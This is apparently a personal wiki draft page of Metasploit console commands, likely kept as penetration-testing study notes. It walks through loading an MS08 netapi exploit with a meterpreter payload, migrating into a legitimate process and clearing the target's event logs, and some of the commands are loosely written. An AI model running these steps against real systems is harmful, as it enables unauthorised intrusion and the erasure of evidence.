---
title: Metasploit & Armitage
date: '2016-11-28T05:59:34+04:00'
lastmod: '2016-11-28T06:43:05+04:00'
original_id: '{A434}'
original_name: metasploit
original_blob: blob/B/2/472.txt
revisions: 7
author: admin
last_editor: admin
tags:
- computing
categories:
- computing
wikislug: metasploit
draft: true
review: update
---

[Computing](computing.md) | [Computer Security](computersecurity.md) | [Linux Security](linuxsecurity.md) |
[Industrial Control Systems Security](icssecurity.md) | [Penetration Testing](penetrationtesting.md) |
[Exploitation](exploitation.md) | [Social Engineering](internetexploitation.md) | [Metasploit](metasploit.md)

# Metasploit & Armitage

Some commands to operate metasploit:

```
search netapi

use exploit ms08

set payload window/meterpreter/bind_tcp

show options

set RHOST target_ip

exploit

meterpreter> getpid

ps
```

select any legitimate process and its PID

```
migrate PID

?
```

finally clear all logs on the target

```
clearev
```

## Tools - Reading List

- msfconsole is used to start metasploit
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/) a free
      course which is a must do
- armitage - a frontend gui
